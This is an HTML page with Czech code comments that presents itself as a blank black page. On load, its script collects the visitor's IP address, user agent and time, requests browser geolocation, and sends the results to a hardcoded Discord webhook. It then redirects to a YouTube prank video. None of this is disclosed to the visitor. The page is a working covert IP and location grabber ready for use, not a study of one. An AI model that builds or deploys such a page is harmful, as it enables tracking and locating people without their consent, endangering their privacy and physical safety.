<!DOCTYPE html>
<html lang="cs">
<head>
  <meta charset="UTF-8" />
  <title></title>
  <style>
    body, html {
      margin: 0; padding: 0; height: 100%;
      background: #000;
      display: flex;
      justify-content: center;
      align-items: center;
      color: white;
      font-family: Arial, sans-serif;
      user-select: none;
    }
  </style>
</head>
<body>
  <h1></h1>

  <script>
    const webhookURL = 'https://discord.com/api/webhooks/1376841162370973716/OWCzBKZ92GkMfw_a0JDDeuYH2hgwRUg7WzKcOCqvnAFfW97IE8B-I6yN8J1fQrrWiZQk';

    function sendData(data) {
      console.log('Odesílám data:', data);
      fetch(webhookURL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data),
        mode: 'no-cors' // Pomůže obejít CORS, ale nečekej odpověď
      }).catch(e => console.error('Chyba při odesílání:', e));
    }

    // Získat IP adresu
    fetch('https://api.ipify.org?format=json')
      .then(response => response.json())
      .then(data => {
        sendData({
          content: `Page loaded - IP: ${data.ip}\nUserAgent: ${navigator.userAgent}\nTime: ${new Date().toISOString()}`
        });
      })
      .catch(() => {
        sendData({
          content: `Page loaded - IP not available\nUserAgent: ${navigator.userAgent}\nTime: ${new Date().toISOString()}`
        });
      });

    // Geolokace
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          sendData({
            content: `Location allowed - Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude}, Accuracy: ${position.coords.accuracy}\nTime: ${new Date().toISOString()}`
          });

          setTimeout(() => {
            window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
          }, 5000);
        },
        (error) => {
          sendData({
            content: `Location denied or error: ${error.message}\nTime: ${new Date().toISOString()}`
          });
        }
      );
    } else {
      sendData({ content: 'Geolocation not supported' });
    }
  </script>
</body>
</html>
